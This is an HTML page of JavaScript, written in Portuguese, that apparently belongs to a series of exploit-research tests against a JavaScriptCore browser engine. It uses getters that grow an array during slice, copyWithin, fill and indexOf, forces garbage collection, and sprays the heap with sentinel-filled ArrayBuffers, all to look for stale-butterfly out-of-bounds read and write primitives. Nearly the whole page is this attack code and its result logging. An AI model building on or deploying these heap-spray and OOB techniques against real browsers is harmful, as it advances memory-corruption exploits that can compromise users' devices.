<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 33 - Array Getter Inconsistency: Do length-stale ao OOB</title></head>
<body>
<h2>TEST 33 — Getter Expande Array: Do `slice usou length antigo` ao OOB Read</h2>

<p><b>Achado original (TEST 26-C):</b></p>
<ul>
  <li><code>slice()</code> → capturou <b>5 elementos</b> (leu length <i>antes</i> do getter de arr[2])</li>
  <li><code>Array.from()</code> → capturou <b>100.000 elementos</b> (leu length <i>depois</i> do getter)</li>
</ul>
<p><b>Significado:</b> <code>slice()</code> cacheia o <code>length</code> <i>antes</i> de iterar os índices.
O getter em <code>arr[2]</code> expande o array para 100k elementos durante o acesso do índice 2.
<code>slice()</code> já reservou espaço para 5 elementos, mas o backing store do array fonte agora é
diferente — potencial de leitura com layout desatualizado.</p>

<p><b>O que investigamos aqui:</b></p>
<ul>
  <li><b>33-A</b> Confirmar e quantificar o stale-length em slice()</li>
  <li><b>33-B</b> Verificar o que slice() copiou dos elementos pós-expansão (leu do butterfly antigo?)</li>
  <li><b>33-C</b> Criar backing store controlado: getter aloca ArrayBuffer no lugar exato do antigo</li>
  <li><b>33-D</b> Usar copyWithin / fill / indexOf sobre array com stale butterfly para OOB</li>
</ul>

<pre id="log">Pronto. Execute na ordem A → B → C → D.</pre>
<button onclick="runA()">33-A: CONFIRMAR STALE LENGTH</button>
<button onclick="runB()">33-B: O QUE SLICE COPIOU?</button>
<button onclick="runC()">33-C: CONTROLAR BUTTERFLY</button>
<button onclick="runD()">33-D: OOB COM COPYWITHIN</button>

<script>
var log = document.getElementById('log');
function info(m)  { log.textContent += '\n[INFO] ' + m; }
function alerta(m){ log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
function ok(m)    { log.textContent += '\n[OK]   ' + m; }
function sep()    { log.textContent += '\n' + '-'.repeat(60); }
function hex(v)   { return '0x' + (v >>> 0).toString(16).padStart(8, '0'); }

function forceGC() {
  var t=[]; for(var i=0;i<80000;i++) t.push({x:i, b:new Uint8Array(4)}); t=null;
}

// ─── 33-A ────────────────────────────────────────────────────────────────────
function runA() {
  log.textContent = '[TEST 33-A] Confirmar e quantificar o stale-length em operacoes de array...\n';
  sep();

  var ORIGINAL_SIZE = 5;
  var EXPANDED_SIZE = 100000;
  var SENTINEL      = 13.37; // valor sentinela nos novos elementos

  function buildArray(trapIdx, expandSize, sentinelValue) {
    var arr = [];
    for(var i = 0; i < ORIGINAL_SIZE; i++) arr.push(i * 1.0);

    var triggered = false;
    Object.defineProperty(arr, trapIdx, {
      get: function() {
        if(!triggered) {
          triggered = true;
          // Expandir o array durante a leitura do indice trapIdx
          for(var k = ORIGINAL_SIZE; k < expandSize; k++) {
            arr[k] = sentinelValue; // preencher com sentinel
          }
          forceGC(); // GC para pressionar o butterfly antigo
        }
        return trapIdx * 1.0; // retornar valor "normal" para o indice
      },
      configurable: true,
      enumerable: true
    });

    return arr;
  }

  // Testar quais operacoes usam length antigo vs novo
  var operations = [
    {
      name: 'slice()',
      fn: function(arr) { return arr.slice(); }
    },
    {
      name: 'slice(0, 3)',
      fn: function(arr) { return arr.slice(0, 3); }
    },
    {
      name: 'concat([])',
      fn: function(arr) { return arr.concat([]); }
    },
    {
      name: 'Array.from()',
      fn: function(arr) { return Array.from(arr); }
    },
    {
      name: '[...spread]',
      fn: function(arr) { return [...arr]; }
    },
    {
      name: 'map(v=>v)',
      fn: function(arr) { return arr.map(function(v){return v;}); }
    },
    {
      name: 'filter(v=>true)',
      fn: function(arr) { return arr.filter(function(){return true;}); }
    },
  ];

  operations.forEach(function(op) {
    var arr = buildArray(2, EXPANDED_SIZE, SENTINEL);
    var result;
    try {
      result = op.fn(arr);
      var sentinelCount = 0;
      for(var i = 0; i < result.length; i++) {
        if(result[i] === SENTINEL) sentinelCount++;
      }
      info(op.name + ': result.length=' + result.length +
           ' | sentinel count=' + sentinelCount +
           ' | usou: ' + (result.length === ORIGINAL_SIZE ? 'LENGTH ANTIGO (' + ORIGINAL_SIZE + ')' : 'LENGTH NOVO (' + result.length + ')'));

      if(result.length === ORIGINAL_SIZE && arr.length === EXPANDED_SIZE) {
        alerta(op.name + ' USOU LENGTH ANTIGO (' + ORIGINAL_SIZE + ') mas array foi expandido para ' + arr.length + '! Stale butterfly lido.');
      }
    } catch(e) {
      alerta('EXCECAO em ' + op.name + ': ' + e.message);
    }
  });

  sep();
  info('Conclusao: operacoes que relatam LENGTH ANTIGO sao candidatas a stale butterfly read.');
}

// ─── 33-B ────────────────────────────────────────────────────────────────────
function runB() {
  log.textContent = '[TEST 33-B] O que slice() copiou dos elementos pos-expansao?\n';
  sep();
  info('Objetivo: verificar se slice() com stale-length leu elementos do butterfly ANTIGO');
  info('ou se os elementos extras sao simplesmente cortados.\n');

  var ORIGINAL_SIZE = 5;
  var EXPANDED_SIZE = 20; // menor — para ver todos os valores
  var POISON_VALUE  = 9999.0; // valor facilmente reconhecivel

  // Preencher o array original com valores distintos
  var arr = [100.0, 200.0, 300.0, 400.0, 500.0];

  var triggered = false;
  Object.defineProperty(arr, 2, {
    get: function() {
      if(!triggered) {
        triggered = true;
        // Expandir preenchendo com POISON para alem do original
        for(var k = ORIGINAL_SIZE; k < EXPANDED_SIZE; k++) {
          arr[k] = POISON_VALUE;
        }
        // Tambem MODIFICAR os elementos originais apos a expansao
        arr[0] = 111.0;
        arr[1] = 222.0;
        arr[3] = 444.0;
        arr[4] = 555.0;
        forceGC();
        info('Getter[2]: array expandido. Elementos [0,1,3,4] modificados. arr.length=' + arr.length);
      }
      return 333.0; // valor para o indice 2
    },
    configurable: true,
    enumerable: true
  });

  info('Array original: [100, 200, 300, 400, 500] (length=' + ORIGINAL_SIZE + ')');
  info('Getter em [2] vai: expandir para 20, modificar [0,1,3,4], retornar 333');
  sep();

  // slice() — usa length antigo?
  var sliced = arr.slice();
  info('slice() result: [' + Array.from(sliced).join(', ') + '] (length=' + sliced.length + ')');

  if(sliced.length === ORIGINAL_SIZE) {
    alerta('slice() USOU LENGTH ANTIGO: retornou ' + ORIGINAL_SIZE + ' elementos');
    // Verificar quais valores foram copiados (antes ou depois da modificacao)
    var expected_pre  = [100, 200, 333, 400, 500];  // valores ANTES da mod (exceto [2])
    var expected_post = [111, 222, 333, 444, 555];   // valores DEPOIS da mod

    var matchesPre  = sliced.every(function(v,i){ return v === expected_pre[i]; });
    var matchesPost = sliced.every(function(v,i){ return v === expected_post[i]; });

    info('Valores copiados:   [' + Array.from(sliced).join(', ') + ']');
    info('Esperado pre-mod:   [' + expected_pre.join(', ') + '] → match=' + matchesPre);
    info('Esperado post-mod:  [' + expected_post.join(', ') + '] → match=' + matchesPost);

    if(matchesPre) {
      alerta('slice() COPIOU VALORES PRE-MODIFICACAO: leu do butterfly ANTIGO antes do getter expandir! Stale read confirmado — o butterfly original ainda estava na memoria durante o slice.');
    } else if(matchesPost) {
      ok('slice() leu valores pos-modificacao (butterfly atualizado antes da copia)');
    } else {
      alerta('slice() copiou MIX de valores: [' + Array.from(sliced).join(', ') + '] — leitura parcialmente stale!');
    }
  } else {
    info('slice() usou length novo (' + sliced.length + ') — sem stale neste run');
  }

  sep();
  info('arr.length apos operacao: ' + arr.length);
  info('arr[10]: ' + arr[10] + ' | arr[19]: ' + arr[19]);
}

// ─── 33-C ────────────────────────────────────────────────────────────────────
function runC() {
  log.textContent = '[TEST 33-C] Controlar o butterfly: getter aloca buffer no lugar do antigo...\n';
  sep();
  info('Objetivo: quando o getter expande o array, o butterfly antigo e liberado.');
  info('Tentamos alocar um ArrayBuffer controlado no mesmo espaco de heap.');
  info('Se slice() ainda le do butterfly antigo, le nosso ArrayBuffer.\n');

  var ORIGINAL_SIZE = 8;
  var SENTINEL_HEX  = 0xDEADC0DE;

  // Butterflies de Float64Array em JSC tem tamanho previsivel
  // Tentar spray de ArrayBuffers de ~64 bytes (tamanho de butterfly para 8 doubles)
  var heapSpray = [];
  var SPRAY_COUNT = 10000;

  var arr = [];
  for(var i = 0; i < ORIGINAL_SIZE; i++) arr.push(i * 1.0);

  var triggered = false;
  Object.defineProperty(arr, 3, {
    get: function() {
      if(!triggered) {
        triggered = true;
        info('Getter[3]: expandindo array e fazendo spray...');

        // Expandir para liberar o butterfly atual
        for(var k = ORIGINAL_SIZE; k < 100; k++) arr[k] = 0.0;

        // GC para coletar o butterfly antigo
        forceGC();

        // Spray: alocar ArrayBuffers do tamanho do butterfly antigo
        // Float64 butterfly para 8 elementos ≈ 64-128 bytes
        for(var j = 0; j < SPRAY_COUNT; j++) {
          var sb = new ArrayBuffer(64);
          var sv = new Uint32Array(sb);
          // Preencher com valor sentinel em todos os Uint32
          for(var x = 0; x < sv.length; x++) sv[x] = SENTINEL_HEX;
          heapSpray.push(sb);
        }
        forceGC();

        info('Spray: ' + SPRAY_COUNT + ' buffers de 64 bytes com sentinel 0x' + SENTINEL_HEX.toString(16));
      }
      return 3.0;
    },
    configurable: true,
    enumerable: true
  });

  // slice() com stale butterfly — se ler do butterfly antigo (agora spray), vera sentinel
  var sliced = arr.slice();
  info('\nslice() result: length=' + sliced.length);

  var f64buf = new ArrayBuffer(8);
  var f64view = new Float64Array(f64buf);
  var u32view = new Uint32Array(f64buf);

  var sentinelFound = 0;
  sliced.forEach(function(v, i) {
    f64view[0] = v;
    var isActualSentinel = (u32view[0] === SENTINEL_HEX && u32view[1] === SENTINEL_HEX);
    var isSentinelLo     = (u32view[0] === SENTINEL_HEX || u32view[1] === SENTINEL_HEX);

    info('sliced[' + i + '] = ' + v + ' | u32=[' + hex(u32view[0]) + ',' + hex(u32view[1]) + ']' +
         (isActualSentinel ? ' *** SENTINEL! ***' : ''));

    if(isActualSentinel) sentinelFound++;
    else if(isSentinelLo) {
      alerta('SENTINEL PARCIAL em sliced[' + i + ']: u32=[' + hex(u32view[0]) + ',' + hex(u32view[1]) + '] — byte do spray encontrado no slice!');
    }
  });

  if(sentinelFound > 0) {
    alerta('SPRAY ENCONTRADO NO SLICE! ' + sentinelFound + ' elementos contem 0x' + SENTINEL_HEX.toString(16) + ' — slice() leu do butterfly substituido pelo spray!');
  } else {
    ok('Sentinel nao encontrado no slice — butterfly nao foi substituido pelo spray neste run.');
    info('Dica: aumentar SPRAY_COUNT ou diminuir ORIGINAL_SIZE pode ajudar.');
  }
}

// ─── 33-D ────────────────────────────────────────────────────────────────────
function runD() {
  log.textContent = '[TEST 33-D] OOB via copyWithin / fill / indexOf em array com getter expansor...\n';
  sep();
  info('Objetivo: operacoes que leem E escrevem no mesmo array podem causar OOB');
  info('quando o getter de um indice expande o array durante a operacao.\n');

  var ORIGINAL_SIZE = 10;
  var EXPANDED_SIZE = 50000;
  var WRITE_SENTINEL = 42.0;

  // ---- Teste 1: copyWithin ----
  info('--- copyWithin com getter expansor ---');
  (function() {
    var arr = [];
    for(var i = 0; i < ORIGINAL_SIZE; i++) arr.push(i * 1.0);

    var triggered = false;
    Object.defineProperty(arr, 5, {
      get: function() {
        if(!triggered) {
          triggered = true;
          for(var k = ORIGINAL_SIZE; k < EXPANDED_SIZE; k++) arr[k] = -1.0;
          forceGC();
          info('copyWithin getter[5]: expandido para ' + arr.length);
        }
        return 5.0;
      },
      configurable: true
    });

    info('arr antes: length=' + ORIGINAL_SIZE);
    try {
      // copyWithin(target, start, end) — copia de [start,end) para target
      // Motor le length uma vez e elementos um a um: getter no meio expande
      arr.copyWithin(0, 5); // copiar de [5..end] para [0..]
      info('copyWithin(0, 5) result: arr.length=' + arr.length);
      info('arr[0]=' + arr[0] + ' arr[1]=' + arr[1] + ' arr[EXPANDED_SIZE-1]=' + arr[EXPANDED_SIZE-1]);

      if(arr[0] === -1.0) {
        alerta('copyWithin COPIOU ELEMENTO POS-EXPANSAO (-1.0) para posicao 0 — operacao acessou butterfly apos realloc!');
      }
    } catch(e) {
      alerta('EXCECAO em copyWithin: ' + e.message);
    }
  })();

  sep();

  // ---- Teste 2: fill ----
  info('--- fill com getter expansor ---');
  (function() {
    var arr = [];
    for(var i = 0; i < ORIGINAL_SIZE; i++) arr.push(i * 1.0);

    // Getter no indice que fill vai acessar para calcular o range
    var triggered = false;
    Object.defineProperty(arr, 2, {
      get: function() {
        if(!triggered) {
          triggered = true;
          for(var k = ORIGINAL_SIZE; k < EXPANDED_SIZE; k++) arr[k] = 99.0;
          forceGC();
        }
        return 2.0;
      },
      configurable: true
    });

    try {
      // fill(value, start, end) — end pode ser afetado pela expansao?
      arr.fill(WRITE_SENTINEL, 0, ORIGINAL_SIZE);
      info('fill(' + WRITE_SENTINEL + ', 0, ' + ORIGINAL_SIZE + ') result: arr.length=' + arr.length);
      // Verificar se fill escreveu alem do ORIGINAL_SIZE
      var oobWrites = 0;
      for(var i = ORIGINAL_SIZE; i < Math.min(arr.length, ORIGINAL_SIZE + 100); i++) {
        if(arr[i] === WRITE_SENTINEL) oobWrites++;
      }
      if(oobWrites > 0) {
        alerta('fill() ESCREVEU ' + oobWrites + ' ELEMENTOS ALEM DO END ORIGINAL — OOB write em butterfly expandido!');
      } else {
        ok('fill() respeitou o end=' + ORIGINAL_SIZE);
      }
    } catch(e) {
      alerta('EXCECAO em fill: ' + e.message);
    }
  })();

  sep();

  // ---- Teste 3: indexOf / lastIndexOf ----
  info('--- indexOf com getter expansor ---');
  (function() {
    var TARGET_VAL = 9999.0;
    var arr = [];
    for(var i = 0; i < ORIGINAL_SIZE; i++) arr.push(i * 1.0);

    var triggered = false;
    Object.defineProperty(arr, 4, {
      get: function() {
        if(!triggered) {
          triggered = true;
          // Inserir o valor-alvo APOS o final original
          for(var k = ORIGINAL_SIZE; k < EXPANDED_SIZE; k++) {
            arr[k] = (k === ORIGINAL_SIZE + 10) ? TARGET_VAL : 0.0;
          }
          forceGC();
        }
        return 4.0;
      },
      configurable: true
    });

    try {
      var idx = arr.indexOf(TARGET_VAL);
      info('indexOf(' + TARGET_VAL + '): ' + idx);
      if(idx >= ORIGINAL_SIZE) {
        alerta('indexOf ENCONTROU VALOR NO ESPACO EXPANDIDO: idx=' + idx + ' (>= ' + ORIGINAL_SIZE + ') — indexOf percorreu alem do length original!');
      } else if(idx === -1) {
        ok('indexOf nao encontrou — usou length antigo (' + ORIGINAL_SIZE + ') e parou antes do elemento expandido');
      }
    } catch(e) {
      alerta('EXCECAO em indexOf: ' + e.message);
    }

    // lastIndexOf com o array expandido
    try {
      var lastIdx = arr.lastIndexOf(TARGET_VAL);
      info('lastIndexOf(' + TARGET_VAL + '): ' + lastIdx);
      if(lastIdx >= ORIGINAL_SIZE) {
        alerta('lastIndexOf ENCONTROU VALOR EXPANDIDO: idx=' + lastIdx + ' — percorreu alem do length antigo!');
      }
    } catch(e) {
      alerta('EXCECAO em lastIndexOf: ' + e.message);
    }
  })();

  sep();
  info('Resumo dos resultados de 33-D:');
  info('Operacoes que acessam o butterfly pos-expansao = candidatos a OOB read/write.');
  info('Se alguma escreveu alem do range original = primitivo de OOB write confirmado.');
}
</script>
</body>
</html>
